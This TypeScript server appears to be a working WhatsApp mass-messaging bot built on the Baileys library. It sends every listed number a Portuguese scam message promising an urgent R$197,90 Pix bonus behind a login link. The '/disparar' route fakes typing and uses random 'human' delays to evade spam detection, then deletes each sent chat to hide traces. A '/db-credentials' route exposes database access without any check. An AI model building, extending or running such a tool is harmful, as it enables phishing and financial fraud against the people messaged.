import "dotenv/config";
import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import makeWASocket, {
  useMultiFileAuthState,
  DisconnectReason,
  delay,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  Browsers,
  type WASocket,
  type ConnectionState,
} from "@whiskeysockets/baileys";
import pino from "pino";
import axios from "axios";
import { Boom } from "@hapi/boom";
import { getContactsFromDB, importContacts, getDBCredentials } from "./db-client.ts";

const logger = pino({ level: "silent" });

const FIXED_MESSAGE = `🎉 PARABÉNS! 🎉

Seu perfil foi aprovado para receber um bônus imediato de R$197,90 via Pix. ✅

⏳ Oferta válida somente até hoje às 23:59.

Para liberar seu token de segurança e sacar o valor disponível, faça login ou crie seu cadastro no link abaixo:

👉 https://lkrh.pro/f96f5f

⚠️ Atenção: após o prazo, o bônus poderá ser cancelado automaticamente pelo sistema.`;

async function startServer() {
  const app = express();
  app.use(express.json());
  const PORT = 3000;

  let sock: WASocket | null = null;
  let pairingCode: string | null = null;
  let connectionStatus: "connecting" | "open" | "close" | "pairing" = "close";

  let version: any = [2, 3000, 1035194821];
  try {
    const latest = await fetchLatestBaileysVersion();
    version = latest.version;
  } catch (err) {
    console.warn("Aviso: Falha ao buscar última versão do Baileys. Usando fallback.", err);
  }

  async function connectToWhatsApp() {
    // Carrega o estado de autenticação dinamicamente toda vez para suportar limpeza/reconexão limpa
    const { state, saveCreds } = await useMultiFileAuthState("auth_info_baileys");

    sock = makeWASocket({
      version,
      logger,
      printQRInTerminal: false,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, logger),
      },
      browser: Browsers.ubuntu("Chrome"),
      markOnlineOnConnect: true,
    });

    sock.ev.on("connection.update", async (update: Partial<ConnectionState>) => {
      const { connection, lastDisconnect } = update;
      if (connection === "close") {
        const statusCode = (lastDisconnect?.error as Boom)?.output?.statusCode;
        const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
        console.log(
          "Conexão fechada devido a",
          lastDisconnect?.error,
          ", status code:",
          statusCode,
          ", reconectando:",
          shouldReconnect,
        );
        connectionStatus = "close";

        // Encerra o socket atual de forma limpa para evitar vazamento de memória e múltiplas conexões ativas
        if (sock) {
          try {
            sock.ev.removeAllListeners("connection.update");
            sock.ev.removeAllListeners("creds.update");
            sock.end(undefined);
          } catch (e) {
            console.error("Erro ao encerrar socket antigo no fechamento:", e);
          }
          sock = null;
        }

        // SÓ tenta reconectar se houver credenciais salvas no disco para evitar loops infinitos em sessões deslogadas
        const fs = await import("fs");
        const credsExist = fs.existsSync("auth_info_baileys/creds.json");
        if (shouldReconnect && credsExist) {
          console.log("Credenciais ativas encontradas. Tentando reconectar em 5 segundos...");
          await delay(5000);
          connectToWhatsApp().catch((err) => {
            console.error("Erro ao reconectar ao WhatsApp:", err);
          });
        } else {
          console.log("Não reconectando: Sessão deslogada, inexistente ou desconexão definitiva.");
        }
      } else if (connection === "open") {
        console.log("Conexão aberta com sucesso!");
        connectionStatus = "open";
        pairingCode = null;
      }
    });

    sock.ev.on("creds.update", saveCreds);

    return sock;
  }

  // Inicializa a conexão em segundo plano somente se já houver uma sessão salva e ativa
  import("fs").then((fs) => {
    if (fs.existsSync("auth_info_baileys/creds.json")) {
      console.log("Sessão ativa encontrada do WhatsApp. Conectando...");
      connectToWhatsApp().catch((err) => {
        console.error("Erro ao iniciar conexão com WhatsApp:", err);
      });
    } else {
      console.log("Nenhuma sessão ativa encontrada para o WhatsApp. Aguardando novo pareamento...");
    }
  });

  // Router para as rotas da API (suporta prefixos /api e /api/wa)
  const apiRouter = express.Router();

  // Rota para solicitar o Pairing Code
  apiRouter.post("/connect", async (req, res) => {
    const { phone } = req.body || {};
    if (!phone) return res.status(400).json({ error: "Telefone é obrigatório" });

    const cleanPhone = String(phone).replace(/\D/g, "");

    try {
      console.log(`Iniciando processo de pareamento limpo para o número: ${cleanPhone}`);

      // 1. Encerra socket antigo se existir
      if (sock) {
        try {
          sock.ev.removeAllListeners("connection.update");
          sock.ev.removeAllListeners("creds.update");
          sock.end(undefined);
        } catch (e) {
          console.error("Erro ao encerrar socket anterior:", e);
        }
      }

      // 2. Limpa pasta de credenciais se existir
      const fs = await import("fs");
      if (fs.existsSync("auth_info_baileys")) {
        try {
          fs.rmSync("auth_info_baileys", { recursive: true, force: true });
          console.log("Pasta auth_info_baileys removida para garantir pareamento limpo.");
        } catch (e) {
          console.error("Erro ao remover pasta de credenciais:", e);
        }
      }

      sock = null;
      connectionStatus = "close";
      pairingCode = null;

      // 3. Inicializa nova conexão
      await connectToWhatsApp();

      // Aguarda um curto intervalo para a inicialização do socket
      await new Promise((resolve) => setTimeout(resolve, 1500));

      if (!sock) {
        throw new Error("Não foi possível inicializar o socket do WhatsApp");
      }

      // 4. Solicita o Pairing Code
      const code = await sock.requestPairingCode(cleanPhone);
      pairingCode = code || null;
      connectionStatus = "pairing";

      console.log(`Pairing Code gerado com sucesso: ${pairingCode}`);
      res.json({ pairingCode: code });
    } catch (error: any) {
      console.error("Erro ao gerar pairing code:", error);
      res
        .status(500)
        .json({ error: "Erro ao gerar pairing code: " + (error?.message || String(error)) });
    }
  });

  // Rota para desconectar o dispositivo
  apiRouter.post("/disconnect", async (req, res) => {
    try {
      console.log("Solicitação de desconexão recebida.");
      if (sock) {
        try {
          sock.ev.removeAllListeners("connection.update");
          sock.ev.removeAllListeners("creds.update");
          sock.logout();
          sock.end(undefined);
        } catch (e) {
          console.error("Erro ao deslogar socket:", e);
        }
      }

      const fs = await import("fs");
      if (fs.existsSync("auth_info_baileys")) {
        try {
          fs.rmSync("auth_info_baileys", { recursive: true, force: true });
          console.log("Pasta de credenciais excluída.");
        } catch (e) {
          console.error("Erro ao excluir pasta de credenciais:", e);
        }
      }

      sock = null;
      pairingCode = null;
      connectionStatus = "close";
      res.json({ success: true });
    } catch (error: any) {
      console.error("Erro ao desconectar:", error);
      res.status(500).json({ error: "Erro ao desconectar: " + (error?.message || String(error)) });
    }
  });

  // Webhook de Retorno
  const triggerWebhook = async (status: string, target: string, messageId: string) => {
    const webhookUrl = process.env.WEBHOOK_URL;
    if (!webhookUrl) return;

    try {
      await axios.post(webhookUrl, {
        status,
        target,
        messageId,
        timestamp: new Date().toISOString(),
        reward: 0.1,
      });
    } catch (err) {
      console.error("Erro ao disparar Webhook:", err);
    }
  };

  // Rota de Disparo em Massa
  apiRouter.post("/disparar", async (req, res) => {
    const { targets } = req.body || {};

    if (!sock || connectionStatus !== "open") {
      return res.status(400).json({ error: "WhatsApp não conectado" });
    }

    if (!Array.isArray(targets) || targets.length === 0) {
      return res.status(400).json({ error: "Lista de alvos inválida" });
    }

    // Processamento assíncrono para não travar a requisição
    res.json({ status: "queueing", count: targets.length });

    for (const targetRaw of targets) {
      try {
        const target = targetRaw.toString().replace(/\D/g, "") + "@s.whatsapp.net";

        // 1. Simula Digitando (7 a 12 segundos)
        const typingDuration = Math.floor(Math.random() * (12000 - 7000 + 1)) + 7000;
        await sock.sendPresenceUpdate("composing", target);
        await delay(typingDuration);
        await sock.sendPresenceUpdate("paused", target);

        // 2. Envia a mensagem (Sempre a FIXED_MESSAGE de forma imutável)
        const sentMsg = await sock.sendMessage(target, { text: FIXED_MESSAGE });

        if (sentMsg) {
          // 3. Limpeza de Histórico Automática (Delete Chat)
          await sock.chatModify(
            {
              delete: true,
              lastMessages: [{ key: sentMsg.key, messageTimestamp: sentMsg.messageTimestamp }],
            },
            target,
          );

          // 4. Dispara Webhook
          await triggerWebhook("success", target, sentMsg.key?.id || "");
        }

        // 5. Delay randômico humano (30 a 45 segundos)
        const nextDelay = Math.floor(Math.random() * (45000 - 30000 + 1)) + 30000;
        console.log(`Mensagem enviada para ${target}. Próximo em ${nextDelay / 1000}s...`);
        await delay(nextDelay);
      } catch (err) {
        console.error(`Erro ao disparar para ${targetRaw}:`, err);
      }
    }
  });

  // Rota para buscar os contatos cadastrados no banco de dados específico (Supabase)
  apiRouter.get("/contatos", async (req, res) => {
    try {
      const result = await getContactsFromDB();
      res.json(result);
    } catch (error: any) {
      console.error("Erro na rota /api/contatos:", error);
      res.status(500).json({ success: false, error: error?.message || "Erro ao buscar contatos" });
    }
  });

  // Rota para importar contatos em lote (CSV)
  apiRouter.post("/contatos/importar", async (req, res) => {
    const { phones } = req.body || {};
    if (!phones || !Array.isArray(phones)) {
      return res
        .status(400)
        .json({ success: false, error: "Formato inválido. Esperado um array 'phones'." });
    }
    try {
      const result = await importContacts(phones);
      res.json(result);
    } catch (error: any) {
      console.error("Erro na rota /api/contatos/importar:", error);
      res
        .status(500)
        .json({ success: false, error: error?.message || "Erro ao importar contatos" });
    }
  });

  // Rota para expor os dados de acesso de forma segura para o Admin
  apiRouter.get("/db-credentials", (req, res) => {
    try {
      const creds = getDBCredentials();
      res.json(creds);
    } catch (error: any) {
      res.status(500).json({ success: false, error: error?.message });
    }
  });

  apiRouter.get("/status", (req, res) => {
    res.json({
      status: connectionStatus,
      pairingCode,
      connectedAs: sock?.authState?.creds?.me?.id || null,
    });
  });

  // Registra as rotas tanto em /api quanto em /api/wa
  app.use("/api/wa", apiRouter);
  app.use("/api", apiRouter);

  // Vite middleware para desenvolvimento
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
  });

  return app;
}

const app = startServer();
export default app;
